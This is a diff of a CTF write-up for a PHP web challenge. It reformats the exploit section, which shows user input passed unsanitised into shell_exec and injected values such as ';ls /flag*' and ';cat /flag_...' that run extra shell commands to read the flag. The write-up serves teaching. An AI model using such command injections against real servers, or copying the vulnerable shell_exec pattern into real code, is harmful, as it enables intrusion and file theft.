@@ -13,7 +13,7 @@ Challenge: http://h4ck3r.quest:8300/
 
 ## Source code
 :::spoiler code
-```php=
+```php
  <?php
 isset($_GET['source']) and die(show_source(__FILE__, true));
 ?>
@@ -76,14 +76,20 @@ isset($_GET['source']) and die(show_source(__FILE__, true));
 
 ## Exploit
 1. According to the source code, seems there's no any protection.
-2. `shell_exec`
-It used `shell_exec` to parse input string.
-`shell_exec("host '" . $_POST['name'] . "';")`
-`shell_exec("host '" . ';ls /flag*' . "';")`→`host '';ls /flag*'';`
-![](https://i.imgur.com/6rCN8gy.png)
-↓
-`shell_exec("host '" . ';cat /flag_44ebd3936a907d59'. "';")`
-* Note that, you can use `psysh` or `php -a` in Linux with interactive mode to try the payload
+2. It used `shell_exec` to parse input string
+
+    ```
+    shell_exec("host '" . $_POST['name'] . "';")
+    shell_exec("host '" . ';ls /flag*' . "';")
+    →
+    host '';ls /flag*'';
+    ```
+    ![](https://i.imgur.com/6rCN8gy.png)
+
+    ```
+    shell_exec("host '" . ';cat /flag_44ebd3936a907d59'. "';")
+    ```
+    * Note that, you can use `psysh` or `php -a` in Linux with interactive mode to try the payload
 3. Then we got flag!!!
 
 
